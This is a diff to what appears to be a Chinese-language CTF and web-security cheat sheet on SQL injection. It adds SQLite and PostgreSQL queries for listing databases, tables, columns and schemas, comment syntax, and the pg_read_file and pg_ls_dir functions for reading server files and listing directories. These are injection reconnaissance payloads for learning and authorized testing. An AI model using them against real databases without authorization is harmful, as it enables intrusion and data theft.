@@ -549,6 +549,10 @@ cat $(ls)
     - `case when (條件) then ... else ... end`
 - 註解
     - `--`
+- 爆表名
+    - `SELECT name FROM sqlite_master WHERE type='table'`
+- 爆表結構(含Column)
+    - `SELECT sql FROM sqlite_master WHERE type='table'`
 - Boolean Based: SECCON 2017 qual SqlSRF
 ```ruby
 # encoding: UTF-8
@@ -610,6 +614,16 @@ end
     - `decode('MTIzAAE=', 'base64'` => `123\000\001`
 - 不支援limit N, M
     - `limit a offset b` 略過前b筆，抓出a筆出來
+- 註解
+    - `--`
+    - `/**/`
+- 爆庫名
+    - `SELECT datname FROM pg_database`
+- 爆表名
+    - `SELECT tablename FROM pg_tables WHERE schemaname='dbname'`
+- 爆Column
+    - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`
+
 - 其它
     - version()
     - current_database()
@@ -618,6 +632,12 @@ end
         - `SELECT usename FROM pg_user;`
     - `md5('abc')`
     - `replace('abcdefabcdef', 'cd', 'XX')` => `abXXefabXXef`
+    - `pg_read_file(filename, offset, length)`
+        - 讀檔
+        - 只能讀data_directory下的
+    - `pg_ls_dir(dirname)`
+        - 列目錄內容
+        - 只能列data_directory下的
 
 ## ORM injection
 
